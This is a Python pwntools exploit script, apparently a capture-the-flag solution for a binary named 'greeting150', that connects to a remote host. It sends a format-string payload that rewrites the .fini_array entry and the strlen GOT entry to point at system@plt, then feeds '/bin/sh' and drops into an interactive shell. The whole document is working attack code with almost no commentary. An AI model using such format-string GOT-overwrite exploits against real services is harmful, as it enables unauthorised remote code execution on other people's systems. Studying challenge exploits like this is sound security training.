from pwn import *

#p = process('greeting150')
p = remote('111.198.29.45',37465)
elf = ELF('greeting150')
strlen_got = elf.got['strlen']
fini_array = 0x08049934
start_addr = 0x080484f0
system_plt = 0x08048490


print p.recv()
payload = 'aa' + p32(fini_array) + p32(strlen_got)  #add Nice to ... 18 chare
payload += p32(strlen_got+2) + '%34000c%12$hn'
payload += '%65440c%13$hn'
payload += '%33652c%14$hn' 


p.sendline(payload)
p.recv()
p.sendline('/bin/sh\x00')
p.interactive()